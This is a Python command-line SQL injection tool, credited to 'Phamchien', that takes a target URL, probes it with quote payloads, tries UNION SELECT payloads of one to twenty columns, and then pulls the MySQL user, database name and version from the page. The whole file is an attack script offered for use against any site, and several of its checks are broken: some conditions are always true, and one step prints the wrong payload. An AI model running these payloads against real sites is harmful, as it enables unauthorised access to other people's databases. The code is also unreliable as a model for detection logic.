import requests 
import datetime
import time
import colorama
import os
from colorama import Fore
from colorama import Style
from bs4 import BeautifulSoup

colorama.init()

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.YELLOW + Style.BRIGHT + '''
              ___
 _____         H  _____     _ _ 
|  |  |___ ___[,]|   __|___| |_|
|  |  | .'|  _[(]|__   | . | | |
 \___/|__,|_| [)]|_____|_  |_|_|
               V         |_| 
''' + Style.RESET_ALL)
    print("Copyright : Phamchien")
    print("SQL Injection TOOLS")
    print("")
banner()

URL = input("URL TARGET : ")
check_vuln = [
    '%27',
    '*%27',
    '/**8**/%27',
    '**%27',
]
payloads = [
    '/**8**/UNION SELECT ALL 1',
    '/**8**/UNION SELECT ALL 1,2',
    '/**8**/UNION SELECT ALL 1,2,3',
    '/**8**/UNION SELECT ALL 1,2,3,4',
    '/**8**/UNION SELECT ALL 1,2,3,4,5',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19',
    '/**8**/UNION SELECT ALL 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20',
]

def checking_connect():
    print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Checking Connection...")
    response = requests.get(URL)
    if response.status_code == 200:
        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Connection Completed , Status Code : {}".format(response.status_code))
        time.sleep(1)
        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Testing MySQL Injection...")
        for payload_check in check_vuln:
            response_1 = requests.get(URL + payload_check)
            if "at line" or "on line" in response_1.text:
                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed...")
                time.sleep(1)
                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Target VULNERABLE 50% MySQL Injection")
                time.sleep(0.30)
                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting Testing MySQL GET columns")
                for payload in payloads:
                    response_2 = requests.get(URL + payload)
                    if "1" and "2" and "3" and "4" and "5" and "6" and "7" and "8" and "9" and "10" and "11" and "12" in response_2.text:
                        if "The used SELECT" and "Error:" != response_2.text:

                            print("")
                            print("Testing SQL injection Completed : ")
                            print("Parameter : #1(URI)*")
                            print("     Type : Code By Pham Chien")
                            print("     Title : UNION SELECT COLUMNS")
                            print("     Payload : {}".format(payload))
                            print("     Status : {}".format(response_2.status_code))
                            print("     URL : {}".format(URL))
                            print("     Details : Vulnerable")
                            print("")
                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Completed")
                            time.sleep(0.40)
                            print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting GET Name User MySQL...")
                            query = payload
                            payload_1 = query.replace("2", "user()")
                            response_3 = requests.get(URL + payload_1)
                            soup = BeautifulSoup(response_3.text, 'html.parser')
                            get_user = soup.find('h1')
                            get_user1 = soup.find('b')
                            if "[]" != get_user or "[]" != get_user1:
                                if "The used SELECT" != response_3.text:
                                    if "[]" != get_user:
                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed...")
                                        time.sleep(2)
                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Payload : {}{}".format(URL, payload_1))
                                        time.sleep(0.20)
                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "User MySQL : {}{}".format(get_user, get_user1))
                                        time.sleep(0.20)
                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting GET Database name...")
                                        payload_2 = query.replace("2", "database()")
                                        response_4 = requests.get(URL + payload_2)
                                        get_dbs = BeautifulSoup(response_4.text, 'html.parser')
                                        dbs = get_dbs.find('h1')
                                        dbs_2 = get_dbs.find('b')
                                        if "[]" != dbs or "[]" != dbs_2:
                                            if "The used SELECT" != response_4.text:
                                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed...")
                                                time.sleep(2)
                                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Payload : {}{}".format(URL, payload_2))
                                                time.sleep(0.20)
                                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Database Name : {}{}".format(dbs, dbs_2))
                                                time.sleep(0.20)
                                                print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Starting GET Version MySQL...")
                                                payload_3 = payload.replace("2", "version()")
                                                response_5 = requests.get(URL + payload_3)
                                                get_ver = BeautifulSoup(response_5.text, 'html.parser')
                                                ver_1 = get_ver.find('h1')
                                                ver_2 = get_ver.find('b')
                                                if "[]" != ver_1 or "[]" != ver_2:
                                                    if "The used SELECT" != response_5.text:
                                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Checking Completed...")
                                                        time.sleep(2)
                                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Payload : {}{}".format(URL, payload_2))
                                                        time.sleep(0.20)
                                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Version : {}{}".format(ver_1, ver_2))
                                                        time.sleep(0.20)
                                                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Find ALL, (user mysql, database name, version mysql)...")
                                                        time.sleep(2)
                                                        print("Find OUTPUT database : ")
                                                        print("     User MySQL : {}{}".format(get_user, get_user1))
                                                        print("     DBS Name : {}{}".format(dbs, dbs_2))
                                                        print("     Version MySQL : {}{}".format(ver_1, ver_2))
                                                        exit()
                                                else:
                                                    print(Fore.RED + "[WARNING] " + Style.RESET_ALL + "Version : Failed")
                                                    exit()
                                        else:
                                            print(Fore.RED + "[WARNING] " + Style.RESET_ALL + "Dbs : Failed")
                                            exit()
                                    else:     
                                        print(Fore.RED + "[WARNING] " + Style.RESET_ALL + "User : Failed")
                                        exit()
                            else:
                                print(Fore.RED + "[WARNING] " + Style.RESET_ALL + "Testing payload Failed : {}".format(payload_1))
                                exit()
                    else:
                        print(Fore.RED + Style.BRIGHT + "[WARNING] " + Style.RESET_ALL + "your target is not columns")
                        print(Fore.GREEN + "[INFO] " + Style.RESET_ALL + "Testing Payload : {}".format(payload))
                exit()

if __name__ == '__main__':
    checking_connect()
